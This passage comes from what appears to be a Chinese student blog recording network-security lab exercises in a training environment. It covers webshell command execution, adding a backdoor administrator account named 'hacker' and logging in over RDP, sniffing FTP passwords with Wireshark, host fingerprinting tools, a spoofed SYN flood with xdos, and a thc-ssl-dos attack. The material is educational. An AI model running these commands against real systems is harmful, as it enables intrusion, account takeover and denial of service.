<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529200533653.png" alt="image-20200529200533653"></p>
<p>RUN执行，可以得到如下结果</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529201058479.png" alt="image-20200529201058479"></p>
<p>3.4 接下来我们就可以利用上传的一句话木马执行命令，查找目标主机开放的远程桌面端口了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">192.168.1.4/1.php？c=system("tasklist -svc");</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529202243911.png" alt="image-20200529202243911"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">192.168.1.4/1.php？c=system("netstat -ano");</span><br><span class="line">发现这个程序的端口号为45565</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529202214286.png" alt="image-20200529202214286"></p>
<h3 id="【实验结果】-6"><a href="#【实验结果】-6" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><blockquote>
<p>将探测到的目标机开放的远程桌面端口作为【实验结果】提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529202501393.png" alt="image-20200529202501393"></p>
<h2 id="任务四-向目标机添加新用户并控制目标机"><a href="#任务四-向目标机添加新用户并控制目标机" class="headerlink" title="任务四 向目标机添加新用户并控制目标机"></a>任务四 向目标机添加新用户并控制目标机</h2><h3 id="【任务描述】-5"><a href="#【任务描述】-5" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在任务三操作完成的基础上，向目标机添加新用户，并完全控制目标主机系统。</p>
<p>通过完成本实验任务，要求学生在掌握webshell上传及权限获取方法的基础上，掌握向目标机添加新用户，设置用户权限并实现目标机控制的方法，进而掌握企业级复杂网络webshell相关的高级漏洞挖掘和利用方法，具备高级漏洞挖掘和利用、信息系统安全管理的职业能力。</p>
<h3 id="【实验目标】-7"><a href="#【实验目标】-7" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><ul>
<li>理解webshell权限获取的意义和方法。</li>
<li>掌握获取webshell权限基础上控制目标机的方法。</li>
<li>掌握企业级复杂网络漏洞挖掘和利用方法。</li>
</ul>
<p>具备高级漏洞挖掘和利用职业能力。</p>
<h3 id="【实验工具】-6"><a href="#【实验工具】-6" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><p>Firefox（火狐浏览器）</p>
<h3 id="【操作步骤】-5"><a href="#【操作步骤】-5" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p><strong>4.1</strong>向目标机网站（http：//192.168.1.4）添加新用户，用户名：hacker，密码：Beijing123。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net user hacker Beijing123 /add</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204023388.png" alt="image-20200529204023388"></p>
<p><strong>4.2</strong>把hacker用户添加到管理员组，并远程连接目标机，远程连接的时候注意远程连接的端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators hacker /add</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204433906.png" alt="image-20200529204433906"></p>
<p><strong>4.3</strong>以hacker用户（用户名：hacker、密码：Beijing123）身份登录目标机系统。</p>
<p>（提示：可使用工具rdesktop远程连接目标机，远程连接端口可通过在浏览器中使用system()函数执行相关命令来获得）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rdesktop -a 16 192.168.1.4:45565 #端口与第一题不一样</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204949002.png" alt="image-20200529204949002"></p>
<p><strong>4.4</strong>设置目标机C:\2.key文件的可读权限，并查看该文件的具体内容。</p>
<p>设置权限——完全控制</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204924371.png" alt="image-20200529204924371"></p>
<p>最终得到结果：<code>Zenmap</code></p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529204908952.png" alt="image-20200529204908952"></p>
<h3 id="【实验结果】-7"><a href="#【实验结果】-7" class="headerlink" title="【实验结果】"></a>【实验结果】</h3><blockquote>
<p>将探测到的目标机上key2.txt文件的内容作为【实验结果】提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200529205234362.png" alt="image-20200529205234362"></p>
<h1 id="1-3-FTP连接与密码明文抓取-wireshark"><a href="#1-3-FTP连接与密码明文抓取-wireshark" class="headerlink" title="1.3 FTP连接与密码明文抓取-wireshark"></a>1.3 FTP连接与密码明文抓取-wireshark</h1><h2 id="【实验目的】-1"><a href="#【实验目的】-1" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><ul>
<li>掌握数据嗅探的原理</li>
<li>了解协议封装的过程</li>
<li>掌握典型的嗅探工具的使用</li>
</ul>
<h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><p>FTP 是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两个概念： 下载 （Download）和 上传 （Upload）。 下载 文件就是从远程主机拷贝文件至自己的计算机上； 上传 文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。</p>
<p>Wireshark（前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。</p>
<h2 id="【实验工具】-7"><a href="#【实验工具】-7" class="headerlink" title="【实验工具】"></a>【实验工具】</h2><p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523183735541.png" alt="image-20200523183735541"></p>
<p>目标机：192.168.1.3<br>工具：<code>C:\实验工具集\06_网络与无线安全\02_嗅探与欺骗</code></p>
<h2 id="【操作步骤】-6"><a href="#【操作步骤】-6" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h2><p><strong>一、设置wireshark抓包参数</strong></p>
<p>1.1 打开” <code>C:\实验工具集\06_网络与无线安全\02_嗅探与欺骗\第1节 FTP连接与密码明文抓取-wireshark</code>”目录下的WireShark。</p>
<p>1.2 在Capture菜单项中设置抓包的相关参数。</p>
<p>1.3    选择Interfaces…选项，对话框显示可操作的网络适配器。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185215942.png" alt="image-20200523185215942"></p>
<p>1.4    通过Options选项，设置如抓包模式、过滤器、数据包限制字节、存档文件模式、停止规则、名字解析等参数，设置完毕，即可开始捕获网络数据包。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185338662.png" alt="image-20200523185338662"></p>
<p><strong>二、Wireshark下数据包的解析</strong></p>
<p>2.1 首先介绍一下网络结构。网络结构可以分为4层，每层都有不同的功能，由不同的协议组成。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185402160.png" alt="image-20200523185402160"></p>
<p>2.2 EthernetII的帧结构为目的MAC地址+源MAC地址+上层协议类型+数据字段+校验。WireShark利用树形结构显示的协议。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185911287.png" alt="image-20200523185911287"></p>
<p>2.3    第一行为WireShark添加、该帧的相关统计信息。包括捕获时间、编号、帧长度、帧中所含有的协议等。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185833495.png" alt="image-20200523185833495"></p>
<p>2.4    第二行为链路层信息，包括目的MAC地址、源MAC地址、上层协议类型。如图所示。<img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523185954122.png" alt="image-20200523185954122"></p>
<p>2.5 第三行为网络层信息，如此处为IP协议。细节包括版本、头部长度、总长度、标志位、源/目的IP地址、上层协议等。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523190010259.png" alt="image-20200523190010259"></p>
<p>2.6 第四行为传输层信息，包括源/目的端口、序列号、期望的下个序列号、确认号、头部长度、标志位、窗口长度、校验和等。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523190028326.png" alt="image-20200523190028326"></p>
<p>2.7    第五行为应用层信息，内容由具体的应用层协议决定，此处为FTP协议，显示的是响应内容。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523190532347.png" alt="image-20200523190532347"></p>
<p><strong>三、连接建立</strong></p>
<p>3.1打开” <code>C:\实验工具集\06_网络与无线安全\02_嗅探与欺骗\第1节 FTP连接与密码明文抓取-wireshark</code>”目下下的wireshark软件。</p>
<p>3.2单击“start”按钮，开始抓包。如图所示</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523191340943.png" alt="image-20200523191340943"></p>
<p>3.3  打开我的电脑或者资源管理器，在地址栏中输入“ftp:\\192.168.1.3”,默认帐号（test）和密码(123456)。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523191601668.png" alt="image-20200523191601668"></p>
<p>3.4认证成功后。</p>
<p>3.5在wireshark界面中，找到登陆的帐号（test）和密码(123456)</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523191654768.png" alt="image-20200523191654768"></p>
<h2 id="【实验结果】-8"><a href="#【实验结果】-8" class="headerlink" title="【实验结果】"></a>【实验结果】</h2><p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523192948988.png" alt="image-20200523192948988"></p>
<h1 id="1-4-kali主机探测命令与工具集"><a href="#1-4-kali主机探测命令与工具集" class="headerlink" title="1.4 kali主机探测命令与工具集"></a>1.4 kali主机探测命令与工具集</h1><h2 id="【实验目的】-2"><a href="#【实验目的】-2" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><p>熟悉ping、arping、fping、hping3、nbtscan、nping、p0f、xprobe2工具对目标主机的探测方法。</p>
<h2 id="【实验原理】-1"><a href="#【实验原理】-1" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><p>目标识别工具发送特殊构造的数据包，根据返回的应答数据包猜测出目标的端口开放和服务开放情况。</p>
<h2 id="【实验环境】-1"><a href="#【实验环境】-1" class="headerlink" title="【实验环境】"></a>【实验环境】</h2><p>Kali操作系统</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200523195226289.png" alt="image-20200523195226289"></p>
<h2 id="【实验步骤】-2"><a href="#【实验步骤】-2" class="headerlink" title="【实验步骤】"></a>【实验步骤】</h2><p><strong>一、探测工具</strong></p>
<p>1.1 <strong>ping</strong>检查主机是否在线的工具。发送ICMP ECHO REQUEST包到目标主机，如果目标主机在线井且不堵塞ping请求，将回复ICMP ECHO REPLY包。单击桌面，右键菜单选择“在终端中打开”。<br>命令选项：</p>
<ul>
<li>c count, ECHO_REQUEST包发进数量。</li>
<li>i interface address：源地址网络接口。该参数可以是lP地址或网卡名称。</li>
<li>s packetfsize；指定要发送的数据字节数。默认值是56，然后再与8字节的ICMP头数据组台成64字节的ICMP数据</li>
</ul>
<p>1.2 在终端中输入命令“<code>ping –c 5 –s 2000 192.168.1.3</code>”，发送5个大小为2000字节的数据包。注意：发送2000字节的数据包在当前环境下过大，有可能会造成发送失败，所以在做实验的过程中如果出现这个问题，将数值改小一点即可。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524083529309.png" alt="image-20200524083529309"></p>
<p>1.3 <strong>arping</strong>是一个在LAN中使用ARP地址解析协议发现目标主机的工具。arping工具测试特定IP地址在网络中是否在线。该命令只能运行本地局域网内，无法跨越路由器和网关，常用的选项为<code>apring –c</code>，在终端中输入命令“<code>arping –c 4 192.168.1.3</code>”，发送四个ping数据包到目标主机。如图所示</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524083636078.png" alt="image-20200524083636078"></p>
<p>1.4 <strong>fping</strong>命令同时向多个主机发送ping (ICMP ECHO)请求，fping通过监视目标主机的回复来判断主机<strong>是否可用</strong>。如果目标主机发送回应将会从目标记录清单中删除，如果目标主机不响应，该主机将会被标记为不可达。默认情况下，fping将尝试向每个目标发送三个ICMP ECHO包。如图所示。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.1.3 is alive</span><br><span class="line">192.168.1.4 is unreachable</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524083916126.png" alt="image-20200524083916126"></p>
<p>1.5在终端中输入命令“<strong>hping3</strong>”回车后可以打开Tcl脚本交互式界面。向目标主机192.168.1.3发送一个icmp echo request请求数据包。在终端中输入命令“<code>hping send {ip(daddr=192.168.1.3)+icmp(type=0,code=0)}</code>”，即发送ping应答，然后再输入命令“<code>hping recv eth0</code>”用户监听返回的数据包。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085035752.png" alt="image-20200524085035752"></p>
<p>1.6 <strong>nbtscan</strong> 通过扫描lP地址获取目标NetBIOS名字信息的工具，生成包含对应主机IP地址、NetBIOS计算机名、可用服务、登录用户名和MAC地址的报告，在终端中输入命令“<code>nbtscan 192.168.1.3</code>”查看目标主机的NETBIOS信息。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085129930.png" alt="image-20200524085129930"></p>
<p>1.7 在终端中输入“<code>nbtscan –hv 192.168.1.3</code>”, 参数-hv查看目标主机运行服务。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085247858.png" alt="image-20200524085247858"></p>
<p>1.8  <strong>nping</strong>支持多协议（TCP、UDP、ICMP、ARP)，且允许用户设置网络报文格式的探测工具，可以自定义协议头中的字段，在终端中输入命令“<code>nping -c 2 --tcp -p 80 --flags syn 192.168.1.3</code>”，向目标主机80端口发送带SYN标志的TCP数据包2个。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085419395.png" alt="image-20200524085419395"></p>
<p><strong>二、系统识别</strong></p>
<p>2.1 <strong>p0f</strong>是用被动方式探测目标主机操作系统类型的工具，在命令终端中输入命令“<code>p0f –o /root/p0f.log</code>“,把登录信息保存到p0f.log文件中。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085714665.png" alt="image-20200524085714665"></p>
<p>2.2在打开另外一个终端，在终端中输入命令“<code>ftp 192.168.1.3</code>”. 登录目标主机的FTP服务器(用户名:administrator、密码：Simplexue123)。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524085900431.png" alt="image-20200524085900431"></p>
<p>2.3在终端中输入命令“<code>cat /root/p0f.log</code>”,查看探测结果，显示没有成功探测出系统类型(理论上可以弹出目标系统类型,建议换其它目标主机测试)。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524091301005.png" alt="image-20200524091301005"></p>
<p>2.4 <strong>xprobe2</strong>是一个主动的操作系统识别工具。其通过模糊签名匹配、可能性猜测、同时多匹配和签名数据库来识别操作系统。在终端下输入命令“<code>xprobe2 192.168.1.3</code>”探测目标主机操作系统类型，从探测信息看，只探测出是windows系统，具体版本并没有判断正确。如图所示。</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524090714364.png" alt="image-20200524090714364"></p>
<p>扫描出来是Server 2000，目标机是Server 2003，扫描判断错误</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524091104582.png" alt="image-20200524091104582"></p>
<h2 id="【实验思考】"><a href="#【实验思考】" class="headerlink" title="【实验思考】"></a>【实验思考】</h2><p>1.实验中是否探测出目标系统的版本,如果没有，请问如何使探测更加准确?</p>
<p>答：</p>
<p>扫描tcp(-T)中的20，21，22和udp(-U)中的53，67 端口,猜想操作系统。（更进一步，可以提供更多的开放端口以提高准确性）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xprobe2 -T 20,21,22 -U 53,67 192.168.1.3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524091838690.png" alt="image-20200524091838690"></p>
<p>2.</p>
<p><img src="/2020/05/23/2020-03-16-Network-Security-Experiment-1/image-20200524092045616.png" alt="image-20200524092045616"></p>
<h1 id="实验心得与总结"><a href="#实验心得与总结" class="headerlink" title="实验心得与总结"></a>实验心得与总结</h1><ul>
<li>本次实验实践了简单的网络侦察、漏洞挖掘以及FTP明文抓取、kali主机探测等，学习到了很多有用的命令。并且在网络侦察、漏洞挖掘实验中学习了简单的入侵实验。</li>
<li>实验的容量还是很大的（光是网络侦察实验就够劝退人了啊喂。。），但也因此学习到了很多东西（一颗坚毅的心）。对入侵的操作、一句话木马、抓包、漏洞挖掘等，都进行了熟悉。</li>
<li>这部分的工具和思想对我们的日常工作是很有帮助的，并且这些都是后面进行网络渗透的基础，需要认真学习掌握。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>网安平台实验2</title>
    <url>/2020/05/23/2020-05-23-Network-Security-Experiment-2/</url>
    <content><![CDATA[<h1 id="5-利用TCP协议实现synflood攻击"><a href="#5-利用TCP协议实现synflood攻击" class="headerlink" title="5 利用TCP协议实现synflood攻击"></a>5 利用TCP协议实现synflood攻击</h1><h2 id="5-1-实验目的"><a href="#5-1-实验目的" class="headerlink" title="5.1 实验目的"></a>5.1 实验目的</h2><ul>
<li><p>理解SYN攻击原理</p>
</li>
<li><p>熟悉SYN攻击方法</p>
</li>
<li><p>熟悉抵御SYN攻击的方法</p>
</li>
</ul>
<h2 id="5-2-实验原理"><a href="#5-2-实验原理" class="headerlink" title="5.2 实验原理"></a>5.2 实验原理</h2><p>运行syn攻击程序，以靶机为目标主机对其发送syn数据包。查看目标主机状态。</p>
<h2 id="5-3-实验环境"><a href="#5-3-实验环境" class="headerlink" title="5.3 实验环境"></a>5.3 实验环境</h2><p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523100355080.png" alt="image-20200523100355080"></p>
<p>目标机：192.168.1.3 </p>
<p>工具: <code>C:\实验工具集 \ 06_网络与无线安全 \ 01_典型协议攻击</code></p>
<h2 id="5-4-实验步骤"><a href="#5-4-实验步骤" class="headerlink" title="5.4 实验步骤"></a>5.4 实验步骤</h2><h3 id="一、利用xdos工具进行攻击"><a href="#一、利用xdos工具进行攻击" class="headerlink" title="一、利用xdos工具进行攻击"></a>一、利用xdos工具进行攻击</h3><p>1.1    在命令行下打开” <code>C:\实验工具集\06_网络与无线安全\01_典型协议攻击\第3节 SYN攻击\xdos</code>”目录下软件，输入xdos.exe命令，显示出xdos命令使用格式。如下图所示</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523101348186.png" alt="image-20200523101348186"></p>
<p>1.2   切换到(192.168.1.3)的目标机器上，打开桌面的wireshark，选中要监听的网卡后，单击Start按钮。在filter中输入：<code>ip.dst==192.168.1.3</code>，点击apply。如下图所示</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523101945212.png" alt="image-20200523101945212"></p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523102117860.png" alt="image-20200523102117860"></p>
<p>1.3    命令行下输入命令<code>xdos 192.168.1.3  135 –t 5 –s 55.55.55.55</code>；   135为连接端口-t 3 表示开启的进程，-s 后跟的ip地址为syn数据包伪装的源地址的起始地址，正在对本地发送syn数据包。如下图所示</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523102250942.png" alt="image-20200523102250942"></p>
<h3 id="二、利用wireshark软件抓取SYN数据包"><a href="#二、利用wireshark软件抓取SYN数据包" class="headerlink" title="二、利用wireshark软件抓取SYN数据包"></a>二、利用wireshark软件抓取SYN数据包</h3><p>2.1 正常情况下，可以看到大量的syn向192.168.1.3主机发送，并且将源地址改为55.55.55.55后面的ip地址。下面是在攻击机上抓到的synflood流量包，如下图所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524102547057.png" alt="image-20200524102547057"></p>
<p>2.2 但由于192.168.1.3机器做了安全防护，除本机外，仅允许IP为192.168.1.2的机器访问，因此将synflood攻击命令进行适当的修改，将源IP改为192.168.1.1：<code>xdos 192.168.1.3  135 –t 3 –s 192.168.1.1</code>。如下图所示</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523103428946.png" alt="image-20200523103428946"></p>
<p>2.3 开始攻击后，将会模拟192.168.1.0/16网段的IP，从192.168.1.1这个IP开始，IP逐渐递增的发送SYN包。下面是在攻击机上抓到的synflood流量包，如图6所示</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524102839035.png" alt="image-20200524102839035"></p>
<p>2.4可以看到上图中包含了192.168.1.2和192.168.1.3两个源IP的数据包，而仅有源IP为192.168.1.2和192.168.1.3的数据包才可通过安全防护，访问到192.168.1.3机器。下面是在目标机192.168.1.3上抓到的流量包，过滤条件为<code>tcp.flags==0x02</code>，因为SYN标志位为0x02。如图7所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523104146437.png" alt="image-20200523104146437"></p>
<h2 id="5-5-实验思考"><a href="#5-5-实验思考" class="headerlink" title="5.5 实验思考"></a>5.5 实验思考</h2><p>如何防范xdos攻击</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523104421807.png" alt="image-20200523104421807"></p>
<h1 id="6-thc-ssl-dos攻击https站点"><a href="#6-thc-ssl-dos攻击https站点" class="headerlink" title="6 thc-ssl-dos攻击https站点"></a>6 thc-ssl-dos攻击https站点</h1><h2 id="6-1-实验目的"><a href="#6-1-实验目的" class="headerlink" title="6.1 实验目的"></a>6.1 实验目的</h2><p>使用thc-ssl-dos工具攻击目标网站,使目标网站无法正常访问。</p>
<h2 id="6-2-实验原理"><a href="#6-2-实验原理" class="headerlink" title="6.2 实验原理"></a>6.2 实验原理</h2><ul>
<li><p>拒绝服务攻击(Dos)<br>常见的DOS攻击都会包含用额外通信请求来形成流向目标的洪水。这些过载会导致资源无法响应合理的网络请求，或是显著的降低响应的速度。Dos攻击可以针对系统资源，配置信息、状态信息等能对系统运行造成危害的所有操作。该攻击工具的一个最基本特点是，它仅需要对加密密钥进行重新请求——而加密密钥被用来在服务器端和客户端创建高达1000并行连接。　因此，任何一台SSL服务器在这种工具面前都失去了免疫——包括Web服务器、电子邮件服务器等。漏洞存在于协议的 renegotiation过程中，renegotiation被用于浏览器到服务器之间的验证。网站可以在不启用renegotiation进程的情况 下使用HTTPS，但研究人员指出很多网站仍然默认启用renegotiation。</p>
</li>
<li><p>Dos攻击分类：<br>基于带宽的攻击：包括UDP洪水、ICMP洪水和其它基于欺骗数据包的洪水，其目的在于<strong>耗尽受害者站点的带宽</strong>。<br>协议攻击：利用网络协议的漏洞进行攻击，如ARP、DDOS、TCP半连接、SYN洪水攻击等。这些协议本身都是正常的，但是用在不正常的地方就成了病毒了。<br>应用层攻击：利用合法网络数据来使web服务崩溃。</p>
</li>
</ul>
<h2 id="6-3-实验环境"><a href="#6-3-实验环境" class="headerlink" title="6.3 实验环境"></a>6.3 实验环境</h2><p>Kali操作系统</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200523195226289.png" alt="image-20200523195226289"></p>
<h2 id="6-4-实验步骤"><a href="#6-4-实验步骤" class="headerlink" title="6.4 实验步骤"></a>6.4 实验步骤</h2><h3 id="一、攻击目标网站"><a href="#一、攻击目标网站" class="headerlink" title="一、攻击目标网站"></a>一、攻击目标网站</h3><p>1.1     单击桌面空白处，右键菜单选择“<code>在终端中打开</code>”。如图所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524093435526.png" alt="image-20200524093435526"></p>
<p>1.2    在浏览器里输入<code>http://192.168.1.3</code>，网站正常。如图所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524093522720.png" alt="image-20200524093522720"></p>
<p>1.3    在终端中输入命令“<code>thc-ssl-dos</code>”。如图所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524095428273.png" alt="image-20200524095428273"></p>
<p>1.4    切换到目标机，打开<strong>wireshark</strong>，开始抓包。再切换到操作机，在终端输入命令”<code>thc-ssl-dos –l 15 192.168.1.3 443 --accept</code>”,对目标主机443端口建立100条连接进行泛洪攻击，l参数越大，目标主机资源消耗越大（因实验环境限制，l参数不要超过15，否则目标主机死机）。如图所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524095609498.png" alt="image-20200524095609498"></p>
<p>1.5    切换到目标机，打开桌面上的<strong>wireshark</strong>，点击Start，从抓包可见当客户端连接到服务端正常握手后，客户端重复发起握手，进行循环攻击。如图所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524095730555.png" alt="image-20200524095730555"></p>
<p>1.6    在目标主机上打开任务管理器，发现CPU利用率100%。如图所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524095834478.png" alt="image-20200524095834478"></p>
<p>1.7    在目标主机的命令行中输入<code>netstat –an</code>，这条命令是在windows下查看自己的电脑系统正在使用那些端口，以分辨有没有非法的侵入,查看一下连接,发现大量攻击机和目标机连接。如图所示。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524095925240.png" alt="image-20200524095925240"></p>
<h2 id="6-5-实验思考"><a href="#6-5-实验思考" class="headerlink" title="6.5 实验思考"></a>6.5 实验思考</h2><p>1．系统自带的防火墙能阻止攻击吗？</p>
<p>答：</p>
<p>不能。</p>
<p>防火墙防不了DDoS攻击，DDoS只是访问量增加，除非你不让别人访问，当流量超出服务器的网络带宽时，服务器就百会拥堵到无法访问，也就是瘫痪。</p>
<p><img src="/2020/05/23/2020-05-23-Network-Security-Experiment-2/image-20200524100338651.png" alt="image-20200524100338651"></p>
]]></content>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>翻译</title>
    <url>/2020/05/11/2020-05-11-translate-1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="6615f42c027ac75b93d444c1354e20793dbdef60a189868d6272bfa377a9b989">f1c5d9f8cd8cff9e34fc4afdbd6ba84b8571a824a9bb46bbf330b6eb06d1f0f17d615a6dd66bff3bc3eaaf330cabf56a15b09253052658dc604333ba9b9636bcf4b438a3b3bbe719d356f481fd6cc3f73de3c956242bfce6bd93700c5864e10357c61afa40b722b1df003669fdede8cb5b706bd5096c7f434c0ec68512941fc2cf6695d7b2a35f0c06b9161d91afcb93167d19469a8bf659f9915b2e011354197abfaa74d52375076b5f5a8171134aa514076aafa0dda73ccb9727003d4fb744695d3660a4621e12232170ac969a887564a72b2be5951e28ba96129eb5accbe0a780df0b0cfb2d2c52630fcf243684c4eb1fb692f86ba5080e8c842f1355f2aff0262b655ecbd7d809306913070fdbe43ef486a85b678c9d732651a852805cf7dc40da64e06194092016bc3829ba4e86da7688d4c8df4f3e84585a7b058cd06dca7a21ceb45738d50e02aa4d35ff65745353bf08228097d5f3a8aa8c517ad978724f49150620fbeae11655c41af4de8cc0fd7c4721aeebdcc0c070e90de1317b1c6b9fe480913c5b80b184dda7c8c3a60403ac3d3ae85d509319edf916711c0163430ec3a9d6481b540699308120e644afdd379e01e554ee7ef1b09bb6891e1faa658cfcef5a0ea8d811c0048d247e7773180593a2fe2ad352266257d76b2918417ea890b45e2f71d17415d3bcd80338775e4a3dd4e56283b1d428a5e8173e72320b4b46043bd67b12d4df1f6d66e7bc60bc2bf9c19285dddbec38bd61ab4e0c6e9fc6744dd5ea34e442ed3528c0942f6326e3d47e6d0a4eb524dfaac7d97d555c49377957315e1fc951a2f55f074f1b15fcc9abaa4428ee671d86cac9feb061c427bed99ed2c68f87968518e18d3dff4d369ca2d386d62197fce30b689c1271da9c01ea3676d5d898d87c5f5771c3d7ab903f9f96f7b3a20ec6c4bee45374c1926f5ae5e32b5edbf6385a52d270051c163ecaa35b47dceff9f402b37c9ea7bb111884295e8ab03bf86497360eb54ed70ad2b719716d7c670d01e55527db9d31cf91742ba1fa298666a8574c9c23e5c82ecb452d03aad5f3ee226dcb2ab9daf6187c6efb3b5de0e04babbbf4a63ab0170d57116d2080260d7d72e33f4e16e40b95e67e7bea2bd00125d002dd59682267df6a1285644e90b856542c8af0d39443b548e03e24181fff3fd8afe0363fdda928454eb4d35ce4fa2721e60e32a1ec528b520df704715402e70969aad5a6b24f5c03afd2cc99185de11081b7684c3e3f38a8ce3771e1dac37f82f6ec